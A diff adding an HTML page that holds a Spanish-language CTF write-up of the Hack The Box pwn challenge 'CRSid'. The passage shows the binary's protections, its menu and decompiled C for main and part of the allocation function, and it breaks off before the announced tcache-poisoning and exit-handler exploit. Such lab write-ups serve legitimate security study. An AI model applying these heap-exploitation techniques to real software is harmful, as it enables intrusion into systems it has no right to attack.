@@ -1,0 +1,1097 @@
+<!doctype html><html lang="es"><head><title>CRSid | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Binario de 64 bits. Explotación del heap. Safe-linking. Out-of-bounds write. Tcache poisoning. Exit handlers"><meta itemprop="description" content="Binario de 64 bits. Explotación del heap. Safe-linking. Out-of-bounds write. Tcache poisoning. Exit handlers"><meta name="twitter:card" content="Binario de 64 bits. Explotación del heap. Safe-linking. Out-of-bounds write. Tcache poisoning. Exit handlers"><meta name="twitter:description" content="Binario de 64 bits. Explotación del heap. Safe-linking. Out-of-bounds write. Tcache poisoning. Exit handlers"><meta property="og:description" content="Binario de 64 bits. Explotación del heap. Safe-linking. Out-of-bounds write. Tcache poisoning. Exit handlers"><meta property="og:type" content="website"><meta name="robots" content="index, follow"><meta name="author" content="7Rocky"><meta name="twitter:author" content="7Rocky"><meta property="og:author" content="7Rocky"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:site_name" content="7Rocky"><meta itemprop="name" content="CRSid"><meta property="twitter:title" content="CRSid"><meta property="og:title" content="CRSid"><meta property="og:url" content="https://7rocky.github.io/ctf/htb-challenges/pwn/crsid/"><meta itemprop="keywords" content><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/monokai-sublime.min.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/highlight.min.js"></script>
+<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
+<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/htb-challenges/pwn/crsid/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/htb-challenges/pwn/crsid/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/htb-challenges/pwn/crsid/&text=CRSid" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/ctf/htb-challenges/pwn/crsid/&title=CRSid" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">CRSid</h1><p class="mb4 f6 dib tracked">21 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#ingeniería-inversa">Ingeniería inversa</a><ul><li><a href="#función-de-asignación">Función de asignación</a></li><li><a href="#función-de-liberación">Función de liberación</a></li><li><a href="#función-de-edición">Función de edición</a></li><li><a href="#función-de-información">Función de información</a></li></ul></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a><ul><li><a href="#_safe-linking_"><em>Safe-linking</em></a></li><li><a href="#tcache-_poisoning_">Tcache <em>poisoning</em></a></li><li><a href="#variables-globales">Variables globales</a></li></ul></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a><ul><li><a href="#fugando-direcciones-de-memoria">Fugando direcciones de memoria</a></li><li><a href="#explotación-del-tcache">Explotación del Tcache</a></li><li><a href="#_exit-handlers_"><em>Exit handlers</em></a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona un binario de 64 bits llamado <code>crsid</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little  
+RELRO:    <span class="code-dark-green">Full RELRO</span>
+Stack:    <span class="code-dark-green">Canary found</span>
+NX:       <span class="code-dark-green">NX enabled</span>
+PIE:      <span class="code-dark-green">PIE enabled</span>
+RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
+</code></pre></div><p>Si lo ejecutamos, tenemos que introducir un <code>CRSid</code> y luego tenemos este menú:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./crsid</span>
+
+ ██████╗██████╗ ███████╗██╗██████╗
+██╔════╝██╔══██╗██╔════╝██║██╔══██╗  
+██║     ██████╔╝███████╗██║██║  ██║
+██║     ██╔══██╗╚════██║██║██║  ██║
+╚██████╗██║  ██║███████║██║██████╔╝
+ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝╚═════╝
+
+[i] Enter your CRSid: asdf
+=========================
+[1] Create username
+[2] Delete username
+[3] Edit username
+[4] Show username
+[5] Change your CRSid
+[6] Exit
+=========================
+[#]
+</code></pre></div><h2 id="ingeniería-inversa">Ingeniería inversa</h2><p>Se trata de un reto típico de explotación del <em>heap</em>. El proceso de ingeniería inversa es relativamente sencillo, aunque el binario no tiene símbolos. Esta es la función <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtkw"> </span><span class="mtk8">main</span><span class="mtk1">()</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">int</span><span class="mtkw"> </span><span class="mtk1">err;</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">int</span><span class="mtkw"> </span><span class="mtk1">ret;</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">long</span><span class="mtkw"> </span><span class="mtk1">in_FS_OFFSET;</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">int</span><span class="mtkw"> </span><span class="mtk1">option;</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">int</span><span class="mtkw"> </span><span class="mtk1">changed_username;</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">long</span><span class="mtkw"> </span><span class="mtk1">canary;</span>
+
+<span class="mtkw">  </span><span class="mtk1">canary</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtkw"> </span><span class="mtk5">*</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk1">(in_FS_OFFSET</span><span class="mtkw"> </span><span class="mtk5">+</span><span class="mtkw"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
+
+<span class="mtkw">  </span><span class="mtk8">setup</span><span class="mtk1">();</span>
+<span class="mtkw">  </span><span class="mtk8">banner</span><span class="mtk1">();</span>
+
+<span class="mtkw">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[i]</span><span class="mtkw"> </span><span class="mtk4">Enter</span><span class="mtkw"> </span><span class="mtk4">your</span><span class="mtkw"> </span><span class="mtk4">CRSid:</span><span class="mtkw"> </span><span class="mtk4">"</span><span class="mtk1">);</span>
+<span class="mtkw">  </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">,</span><span class="mtkw"> </span><span class="mtk1">crsid,</span><span class="mtkw"> </span><span class="mtk6">32</span><span class="mtk1">);</span>
+<span class="mtkw">  </span><span class="mtk1">option</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtkw">  </span><span class="mtk1">changed_username</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+
+<span class="mtkw">  </span><span class="mtk5">do</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">    </span><span class="mtk8">menu</span><span class="mtk1">();</span>
+<span class="mtkw">    </span><span class="mtk1">err</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%d</span><span class="mtk4">"</span><span class="mtk1">,</span><span class="mtkw"> </span><span class="mtk5">&amp;</span><span class="mtk1">option);</span>
+
+<span class="mtkw">    </span><span class="mtk5">if</span><span class="mtkw"> </span><span class="mtk1">(err</span><span class="mtkw"> </span><span class="mtk5">&lt;</span><span class="mtkw"> </span><span class="mtk6">0</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Something</span><span class="mtkw"> </span><span class="mtk4">went</span><span class="mtkw"> </span><span class="mtk4">wrong!"</span><span class="mtk1">);</span>
+<span class="mtkw">      </span><span class="mtk1">ret</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtkw">      </span><span class="mtk5">goto</span><span class="mtkw"> </span><span class="mtk1">LAB_001019a6;</span>
+<span class="mtkw">    </span><span class="mtk1">}</span>
+
+<span class="mtkw">    </span><span class="mtk5">switch</span><span class="mtkw"> </span><span class="mtk1">(option)</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">    </span><span class="mtk5">default</span><span class="mtk1">:</span>
+<span class="mtkw">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Unrecognized</span><span class="mtkw"> </span><span class="mtk4">command!"</span><span class="mtk1">);</span>
+<span class="mtkw">      </span><span class="mtk1">ret</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtkw">      </span><span class="mtk5">goto</span><span class="mtkw"> </span><span class="mtk1">LAB_001019a6;</span>
+<span class="mtkw">    </span><span class="mtk5">case</span><span class="mtkw"> </span><span class="mtk6">1</span><span class="mtk1">:</span>
+<span class="mtkw">      </span><span class="mtk1">err</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk8">create_username</span><span class="mtk1">();</span>
+
+<span class="mtkw">      </span><span class="mtk5">if</span><span class="mtkw"> </span><span class="mtk1">(err</span><span class="mtkw"> </span><span class="mtk5">!=</span><span class="mtkw"> </span><span class="mtk6">0</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">        </span><span class="mtk1">ret</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtkw">        </span><span class="mtk5">goto</span><span class="mtkw"> </span><span class="mtk1">LAB_001019a6;</span>
+<span class="mtkw">      </span><span class="mtk1">}</span>
+
+<span class="mtkw">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtkw">    </span><span class="mtk5">case</span><span class="mtkw"> </span><span class="mtk6">2</span><span class="mtk1">:</span>
+<span class="mtkw">      </span><span class="mtk1">err</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk8">delete_username</span><span class="mtk1">();</span>
+
+<span class="mtkw">      </span><span class="mtk5">if</span><span class="mtkw"> </span><span class="mtk1">(err</span><span class="mtkw"> </span><span class="mtk5">!=</span><span class="mtkw"> </span><span class="mtk6">0</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">        </span><span class="mtk1">ret</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtkw">        </span><span class="mtk5">goto</span><span class="mtkw"> </span><span class="mtk1">LAB_001019a6;</span>
+<span class="mtkw">      </span><span class="mtk1">}</span>
+
+<span class="mtkw">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtkw">    </span><span class="mtk5">case</span><span class="mtkw"> </span><span class="mtk6">3</span><span class="mtk1">:</span>
+<span class="mtkw">      </span><span class="mtk1">err</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk8">edit_username</span><span class="mtk1">();</span>
+
+<span class="mtkw">      </span><span class="mtk5">if</span><span class="mtkw"> </span><span class="mtk1">(err</span><span class="mtkw"> </span><span class="mtk5">!=</span><span class="mtkw"> </span><span class="mtk6">0</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">        </span><span class="mtk1">ret</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtkw">        </span><span class="mtk5">goto</span><span class="mtkw"> </span><span class="mtk1">LAB_001019a6;</span>
+<span class="mtkw">      </span><span class="mtk1">}</span>
+
+<span class="mtkw">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtkw">    </span><span class="mtk5">case</span><span class="mtkw"> </span><span class="mtk6">4</span><span class="mtk1">:</span>
+<span class="mtkw">      </span><span class="mtk1">err</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk8">show_username</span><span class="mtk1">();</span>
+
+<span class="mtkw">      </span><span class="mtk5">if</span><span class="mtkw"> </span><span class="mtk1">(err</span><span class="mtkw"> </span><span class="mtk5">!=</span><span class="mtkw"> </span><span class="mtk6">0</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">        </span><span class="mtk1">ret</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtk1">LAB_001019a6:</span>
+<span class="mtkw">        </span><span class="mtk5">if</span><span class="mtkw"> </span><span class="mtk1">(canary</span><span class="mtkw"> </span><span class="mtk5">!=</span><span class="mtkw"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtkw"> </span><span class="mtk5">*</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk1">(in_FS_OFFSET</span><span class="mtkw"> </span><span class="mtk5">+</span><span class="mtkw"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">))</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">                    </span><span class="mtk3">/*</span><span class="mtkw"> </span><span class="mtk3">WARNING:</span><span class="mtkw"> </span><span class="mtk3">Subroutine</span><span class="mtkw"> </span><span class="mtk3">does</span><span class="mtkw"> </span><span class="mtk3">not</span><span class="mtkw"> </span><span class="mtk3">return</span><span class="mtkw"> </span><span class="mtk3">*/</span>  
+<span class="mtkw">          </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
+<span class="mtkw">        </span><span class="mtk1">}</span>
+
+<span class="mtkw">        </span><span class="mtk5">return</span><span class="mtkw"> </span><span class="mtk1">ret;</span>
+<span class="mtkw">      </span><span class="mtk1">}</span>
+
+<span class="mtkw">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtkw">    </span><span class="mtk5">case</span><span class="mtkw"> </span><span class="mtk6">5</span><span class="mtk1">:</span>
+<span class="mtkw">      </span><span class="mtk5">if</span><span class="mtkw"> </span><span class="mtk1">(changed_username</span><span class="mtkw"> </span><span class="mtk5">==</span><span class="mtkw"> </span><span class="mtk6">0</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Changed</span><span class="mtkw"> </span><span class="mtk4">your</span><span class="mtkw"> </span><span class="mtk4">mind?"</span><span class="mtk1">);</span>
+<span class="mtkw">        </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Enter</span><span class="mtkw"> </span><span class="mtk4">new</span><span class="mtkw"> </span><span class="mtk4">CRSid:</span><span class="mtkw"> </span><span class="mtk4">"</span><span class="mtk1">);</span>
+<span class="mtkw">        </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">,</span><span class="mtkw"> </span><span class="mtk1">crsid,</span><span class="mtkw"> </span><span class="mtk6">32</span><span class="mtk1">);</span>
+<span class="mtkw">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Changed</span><span class="mtkw"> </span><span class="mtk4">successfully!"</span><span class="mtk1">);</span>
+<span class="mtkw">        </span><span class="mtk1">changed_username</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtkw">      </span><span class="mtk1">}</span><span class="mtkw"> </span><span class="mtk5">else</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"No,</span><span class="mtkw"> </span><span class="mtk4">you</span><span class="mtkw"> </span><span class="mtk4">change</span><span class="mtkw"> </span><span class="mtk4">your</span><span class="mtkw"> </span><span class="mtk4">mind</span><span class="mtkw"> </span><span class="mtk4">too</span><span class="mtkw"> </span><span class="mtk4">often."</span><span class="mtk1">);</span>
+<span class="mtkw">      </span><span class="mtk1">}</span>
+
+<span class="mtkw">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtkw">    </span><span class="mtk5">case</span><span class="mtkw"> </span><span class="mtk6">6</span><span class="mtk1">:</span>
+<span class="mtkw">      </span><span class="mtk1">ret</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtkw">      </span><span class="mtk5">goto</span><span class="mtkw"> </span><span class="mtk1">LAB_001019a6;</span>
+<span class="mtkw">    </span><span class="mtk1">}</span>
+<span class="mtkw">  </span><span class="mtk1">}</span><span class="mtkw"> </span><span class="mtk5">while</span><span class="mtkw"> </span><span class="mtk1">(</span><span class="mtk6">true</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+</code></pre></div><h3 id="función-de-asignación">Función de asignación</h3><p>La primera opción es para crear usuarios, por lo que la llamaré <code>create_username</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtkw"> </span><span class="mtk8">create_username</span><span class="mtk1">()</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">int</span><span class="mtkw"> </span><span class="mtk1">num_users;</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">int</span><span class="mtkw"> </span><span class="mtk1">ret;</span>
+<span class="mtkw">  </span><span class="mtk7 mtki">char</span><span class="mtkw"> </span><span class="mtk5">*</span><span class="mtk1">p_user;</span>
+<span class="mtkw">  </span>
+<span class="mtkw">  </span><span class="mtk1">num_users</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk8">check_users</span><span class="mtk1">();</span>
+
+<span class="mtkw">  </span><span class="mtk5">if</span><span class="mtkw"> </span><span class="mtk1">(num_users</span><span class="mtkw"> </span><span class="mtk5">&lt;</span><span class="mtkw"> </span><span class="mtk6">0</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"No</span><span class="mtkw"> </span><span class="mtk4">more</span><span class="mtkw"> </span><span class="mtk4">usernames</span><span class="mtkw"> </span><span class="mtk4">for</span><span class="mtkw"> </span><span class="mtk4">you!"</span><span class="mtk1">);</span>
+<span class="mtkw">    </span><span class="mtk1">ret</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtkw">  </span><span class="mtk1">}</span><span class="mtkw"> </span><span class="mtk5">else</span><span class="mtkw"> </span><span class="mtk1">{</span>
+<span class="mtkw">    </span><span class="mtk1">p_user</span><span class="mtkw"> </span><span class="mtk5">=</span><span class="mtkw"> </span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtkw"> </span><span class="mtk5">*</span><span class="mtk1">)</span><span class="mtkw"> </span><span class="mtk8">malloc</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">40</span><span class="mtk1">);</span>
+
